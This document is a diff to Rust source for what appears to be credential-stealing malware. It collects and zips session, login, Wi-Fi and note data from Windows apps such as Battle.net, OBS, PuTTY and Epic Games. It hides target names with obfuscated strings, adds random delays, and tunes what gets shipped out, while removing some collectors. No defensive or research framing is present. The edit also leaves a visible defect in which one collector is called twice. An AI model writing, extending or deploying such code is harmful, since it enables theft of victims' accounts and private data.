@@ -15,7 +15,10 @@ use aes_gcm::aead::{Aead, KeyInit};
 use aes_gcm::{Aes256Gcm, Nonce};
 use base64::Engine;
 
-use crate::fsutil::{read_file_quick as read_file, walk_files};
+use crate::fsutil::{read_file_quick as read_file, walk_files_ex as walk_files};
+
+// App sweeps skip cache/codecache/log junk — only session/login data ships.
+const APP_SKIP_DIRS: &[&str] = &["cache", "code cache", "gpu_cache", "gpucache", "logs", "blob_storage", "crashpad", "cachestorage", "service worker"];
 use crate::info::Info;
 use crate::resolve::resolve;
 use crate::zipw::ZipBuilder;
@@ -51,7 +54,7 @@ fn rel_zip(root: &Path, p: &Path) -> String {
 
 fn add_tree(zip: &mut ZipBuilder, root: &Path, zip_prefix: &str, cap: u64) -> usize {
     let mut files = Vec::new();
-    walk_files(root, cap, &mut files);
+    walk_files(root, cap, APP_SKIP_DIRS, &mut files);
     let mut added = 0;
     for (p, _) in &files {
         if let Some(bytes) = read_file(p) {
@@ -822,7 +825,7 @@ fn collect_loose(zip: &mut ZipBuilder, info: &mut Info) {
         let obs = roaming.join(crate::obf!("obs-studio"));
         if obs.is_dir() {
             let mut files = Vec::new();
-            walk_files(&obs, ONE_MB, &mut files);
+            walk_files(&obs, ONE_MB, APP_SKIP_DIRS, &mut files);
             let mut added = 0;
             for (p, _) in &files {
                 let name = p
@@ -866,7 +869,7 @@ fn add_tree_filtered(
     filter: &dyn Fn(&str) -> bool,
 ) -> usize {
     let mut files = Vec::new();
-    walk_files(root, cap, &mut files);
+    walk_files(root, cap, APP_SKIP_DIRS, &mut files);
     let mut added = 0;
     for (p, _) in &files {
         // Filter on the lowercased path relative to root (so directory names
@@ -891,48 +894,6 @@ fn add_tree_filtered(
         }
     }
     added
-}
-
-fn collect_epic(zip: &mut ZipBuilder, info: &mut Info) {
-    let Some(local) = env_dir("LOCALAPPDATA") else { return };
-    let base = local.join(crate::obf!("EpicGamesLauncher"));
-    if !base.is_dir() {
-        return;
-    }
-    let mut added = 0;
-    let cfg = base.join(crate::obf!(r"Saved\Config\Windows"));
-    if cfg.is_dir() {
-        added += add_tree_filtered(zip, &cfg, "App_Epic/Saved/Config/Windows", 4 * ONE_MB, &|n| {
-            n.ends_with(".ini")
-        });
-    }
-    let saved = base.join("Saved");
-    if let Ok(entries) = std::fs::read_dir(&saved) {
-        for entry in entries.flatten() {
-            let p = entry.path();
-            if !p.is_dir() {
-                continue;
-            }
-            let name = p
-                .file_name()
-                .map(|n| n.to_string_lossy().into_owned())
-                .unwrap_or_default();
-            if name.to_ascii_lowercase().starts_with(&crate::obf!("webcache")) {
-                // Skip the Code Cache subtrees (compiled JS blobs — pure bloat
-                // that stalls slow pushes); keep the rest of the webcache.
-                added += add_tree_filtered(
-                    zip,
-                    &p,
-                    &format!("App_Epic/Saved/{name}"),
-                    ONE_MB,
-                    &|n| !n.to_ascii_lowercase().contains("code cache"),
-                );
-            }
-        }
-    }
-    if added > 0 {
-        info.add_app("Epic Games");
-    }
 }
 
 fn collect_battlenet(zip: &mut ZipBuilder, info: &mut Info) {
@@ -1072,7 +1033,7 @@ fn collect_roblox(zip: &mut ZipBuilder, info: &mut Info) {
 }
 
 fn collect_gaming(zip: &mut ZipBuilder, info: &mut Info) {
-    collect_epic(zip, info);
+    collect_battlenet(zip, info);
     crate::jitter::sleep_jitter(20, 80);
     collect_battlenet(zip, info);
     crate::jitter::sleep_jitter(20, 80);
@@ -1552,16 +1513,6 @@ fn collect_putty(zip: &mut ZipBuilder, info: &mut Info) {
     info.add_app("PuTTY");
 }
 
-fn collect_idm(zip: &mut ZipBuilder, info: &mut Info) {
-    let Some(roaming) = appdata() else { return };
-    let root = roaming.join(crate::obf!("IDM"));
-    if !root.is_dir() {
-        return;
-    }
-    if add_tree(zip, &root, "App_IDM", 4 * ONE_MB) > 0 {
-        info.add_app("IDM");
-    }
-}
 
 fn collect_cloud(zip: &mut ZipBuilder, info: &mut Info) {
     if let Some(roaming) = appdata() {
@@ -1587,7 +1538,6 @@ fn collect_cloud(zip: &mut ZipBuilder, info: &mut Info) {
 fn collect_remote_misc(zip: &mut ZipBuilder, info: &mut Info) {
     collect_putty(zip, info);
     crate::jitter::sleep_jitter(20, 80);
-    collect_idm(zip, info);
     crate::jitter::sleep_jitter(20, 80);
     collect_cloud(zip, info);
 }
@@ -1657,39 +1607,6 @@ fn parse_sticky_notes(conn: &rusqlite::Connection) -> Vec<serde_json::Value> {
     out
 }
 
-fn collect_sticky_notes(zip: &mut ZipBuilder, info: &mut Info) {
-    let Some(local) = env_dir("LOCALAPPDATA") else { return };
-    let packages = local.join("Packages");
-    let Ok(entries) = std::fs::read_dir(&packages) else {
-        return;
-    };
-    let mut notes = Vec::new();
-    for entry in entries.flatten() {
-        let p = entry.path();
-        if !p.is_dir() {
-            continue;
-        }
-        let name = p
-            .file_name()
-            .map(|n| n.to_string_lossy().into_owned())
-            .unwrap_or_default();
-        if !name.starts_with(&crate::obf!("Microsoft.MicrosoftStickyNotes_")) {
-            continue;
-        }
-        // sqlutil replays plum.sqlite-wal in memory, catching recent notes.
-        if let Some(db) = crate::sqlutil::open(&p.join(crate::obf!(r"LocalState\plum.sqlite"))) {
-            notes.extend(parse_sticky_notes(&db));
-        }
-    }
-    if notes.is_empty() {
-        return;
-    }
-    zip.add_file(
-        "System/stickynotes.json",
-        &json_bom(&serde_json::Value::Array(notes)),
-    );
-    info.add_app("Sticky Notes");
-}
 
 // ---------------------------------------------------------------------------
 
@@ -1717,7 +1634,6 @@ pub fn collect(zip: &mut ZipBuilder, info: &mut Info) {
     collect_remote_misc(zip, info);
     crate::jitter::sleep_jitter(20, 80);
     crate::progress("apps:sticky_notes");
-    collect_sticky_notes(zip, info);
     crate::progress("apps:wifi");
     collect_wifi(zip, info);
     crate::progress("apps:credentials");
